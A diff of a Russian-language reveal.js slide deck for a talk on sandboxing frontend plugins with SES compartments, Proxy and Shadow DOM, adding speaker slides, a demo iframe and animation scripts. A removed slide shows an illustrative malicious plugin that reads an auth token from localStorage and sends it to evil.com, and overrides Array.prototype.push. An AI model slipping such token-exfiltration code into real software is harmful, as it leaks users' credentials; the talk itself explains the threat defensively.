@@ -15,6 +15,7 @@
   <link rel="stylesheet" href="dist/reset.css">
   <link rel="stylesheet" href="dist/reveal.css">
   <link rel="stylesheet" href="dist/theme/white.css">
+    <link rel="stylesheet" href="css/animate.min.css" />
 
 
   <!-- Theme used for syntax highlighted code -->
@@ -26,6 +27,35 @@
         <div class="slides">
             
             <!-- Титульный слайд -->
+            <section>
+                <h1 class="r-fit-text">Не браузерные, а свои</h1>
+                <p>пишем собственную плагинную систему для фронтенд приложения</p>
+            </section>
+        <section
+          style="font-size: 0.8em;"
+          data-me="true"
+          data-background-color="rgb(29 66 95)"
+          data-transition="none"
+          data-background-transition="none"
+        >
+          <h1 data-addclass="animate__animated animate__bounceindown">
+            Алексей Золотых
+          </h1>
+          <p class="fragment fade-up">инженер</p>
+          <p class="fragment fade-up">консультант</p>
+          <p class="fragment fade-up">тимлид</p>
+          <p class="fragment fade-up">спикер</p>
+        </section>
+        <section>
+          <img src="./img/logo.svg" style="height: 50vh" alt="" />
+        </section>
+        <section>
+          <h2>команда веб-редакторов</h2>
+          <img src="./img/office.png" alt="" />
+        </section>
+        <section>
+          <img src="./img/holyjs.svg" style="height: 50vh" alt="" />
+        </section>
             <section>
                 <h1 class="r-fit-text">Не браузерные, а свои</h1>
                 <p>пишем собственную плагинную систему для фронтенд приложения</p>
@@ -359,7 +389,7 @@ compartment.evaluate('console.log("Hello")');
 <!-- Сравнительная таблица -->
 <section>
   <h2>Выбор метода</h2>
-  <table style="font-size: 0.7em;">
+  <table style="font-size: 0.6em;">
     <thead>
       <tr>
         <th>Метод</th>
@@ -792,23 +822,23 @@ class Compartment {
                     </code></pre>
                 </section>
 
-                <section>
-                    <h3>Как работает with + Proxy</h3>
-                    <pre><code class="javascript" data-trim>
-// 1. with создаёт новый scope
-with (scopeProxy) {
-  // 2. При поиске переменной fetch
-  fetch; 
-  // JavaScript спрашивает scopeProxy.has('fetch')
-  // Proxy отвечает: true
-  // JavaScript пытается получить scopeProxy.get('fetch')
-  // Proxy возвращает: undefined (т.к. не передали)
-}
-
-// Результат: fetch === undefined ✅
-// Не можем получить настоящий fetch!
-                    </code></pre>
-                </section>
+<!--                 <section> -->
+<!--                     <h3>Как работает with + Proxy</h3> -->
+<!--                     <pre><code class="javascript" data-trim> -->
+<!-- // 1. with создаёт новый scope -->
+<!-- with (scopeProxy) { -->
+<!--   // 2. При поиске переменной fetch -->
+<!--   fetch;  -->
+<!--   // JavaScript спрашивает scopeProxy.has('fetch') -->
+<!--   // Proxy отвечает: true -->
+<!--   // JavaScript пытается получить scopeProxy.get('fetch') -->
+<!--   // Proxy возвращает: undefined (т.к. не передали) -->
+<!-- } -->
+<!---->
+<!-- // Результат: fetch === undefined ✅ -->
+<!-- // Не можем получить настоящий fetch! -->
+<!--                     </code></pre> -->
+<!--                 </section> -->
 
                 <section>
                     <h3>Диаграмма работы with + Proxy</h3>
@@ -1283,51 +1313,6 @@ worker.onmessage = (event) =&gt; {
                 </section>
             </section>
             
-            <!-- Две главные проблемы -->
-            <section>
-                <section>
-                    <h2>Две главные проблемы</h2>
-                </section>
-
-                <section>
-                    <h3>Проблема 1: Конфликты стилей и DOM</h3>
-                    <pre><code class="css" data-trim>
-/* Плагин A */
-.button { background: red; }
-
-/* Плагин B */
-.button { background: blue; }
-
-/* Кто победит? 🤔 */
-                    </code></pre>
-                    <p>Стили одного плагина "ломают" другой</p>
-                </section>
-
-                <section>
-                    <h3>Пример конфликта DOM</h3>
-                    <pre><code class="javascript" data-trim>
-// Плагин случайно удаляет элемент другого плагина
-document.querySelector('.widget').remove();
-
-// Или меняет содержимое
-document.body.innerHTML = 'Упс! 💥';
-                    </code></pre>
-                </section>
-
-                <section>
-                    <h3>Проблема 2: Вредоносный код</h3>
-                    <pre><code class="javascript" data-trim>
-// Плагин крадёт токены
-const token = localStorage.getItem('auth_token');
-fetch('https://evil.com/steal?token=' + token);
-
-// Или ломает прототипы
-Array.prototype.push = function() {
-  console.log('Хакнуто! 😈');
-};
-                    </code></pre>
-                </section>
-            </section>
 
             <!-- Решение 1: Shadow DOM -->
             <section>
@@ -1455,12 +1440,44 @@ compartment.evaluate(pluginCode);
                         <li>🎮 Игровые моды и дополнения</li>
                     </ul>
                 </section>
-                <section>
+                <section data-auto-animate>
                     <h2>Демонстрация на React</h2>
                     <p>github.com/zolotyh/ses-shadow-demo</p>
                 </section>
+<section data-auto-animate>
+                    <h2>Демонстрация на React</h2>
+      <iframe style="width: 90vw; height: 70vh;" data-src="https://zolotyh.github.io/ses-shadow-demo/"></iframe>
+</section>
 
             </section>
+            <section>
+              <h2>Есть еще такая проблема</h2>
+              <pre><code data-trim>
+while (true) {
+  doSomething();
+}
+
+console.log('All finished');
+              </code></pre>
+            </section>
+            <section>
+<h2 style="font-size: 1em;">
+<a href="https://github.com/jsbin/loop-protect">github.com/jsbin/loop-protect</a>
+
+</h2>
+    <pre><code data-trim>
+let i = 0;
+var _LP = Date.now();
+while (true) {
+  if (Date.now() - _LP > 100)
+    break;
+
+  doSomething();
+}
+
+console.log('All finished');
+</code></pre>
+</section>
 
 
             <!-- Заключение -->
@@ -1513,12 +1530,27 @@ compartment.evaluate(pluginCode);
             <section>
                 <h1>Спасибо!</h1>
                 <h3>Вопросы?</h3>
-                <br>
-                <p>github.com/zolotyh/ses-shadow-demo</p>
+                <p> <img style="max-height: 30vh;" src="img/qr.gif" alt=""> </p>
+                <ul>
+                  <li> <a href="https://t.me/budlatbokr">t.me/budlatbokr</a> </li>
+                  <li> <a href="https://t.me/zolotyh">@zolotyh</a></li>
+                </ul>
             </section>
 
         </div>
     </div>
+    <img
+      class="js-me animate__slideInUp"
+      src="./img/me.png"
+      alt="speaker photo"
+      style="
+        height: 70vh;
+        position: fixed;
+        bottom: 0;
+        right: 50%;
+        display: none;
+      "
+    />
 
     <script src="dist/reveal.js"></script>
     <script src="plugin/notes/notes.js"></script>
@@ -1532,6 +1564,34 @@ compartment.evaluate(pluginCode);
             transition: 'slide',
             plugins: [ RevealMarkdown, RevealHighlight, RevealNotes, RevealMermaid ]
         });
+      Reveal.on("slidechanged", (event) => {
+        const image = document.querySelector(".js-me");
+        const showImage = event.currentSlide.dataset["me"];
+        image.style.display = showImage ? "block" : "none";
+        if (showImage) {
+          image.classList.add("animate__animated");
+        } else {
+          image.classList.remove("animate__animated");
+        }
+      });
+
+
+      Reveal.on("slidechanged", (event) => {
+        event.previousSlide
+          ?.querySelectorAll("[data-addclass]")
+          .forEach((el) => {
+            const classNames = el.dataset["addclass"].split(" ");
+            el.classList.remove(...classNames);
+          });
+        event.currentSlide.querySelectorAll("[data-addclass]").forEach((el) => {
+          const delay = el.dataset["addclassDelay"];
+          const classNames = el.dataset["addclass"].split(" ");
+          setTimeout(
+            () => el.classList.add(...classNames),
+            delay ? parseInt(delay, 10) : 0,
+          );
+        });
+      });
     </script>
 </body>
 
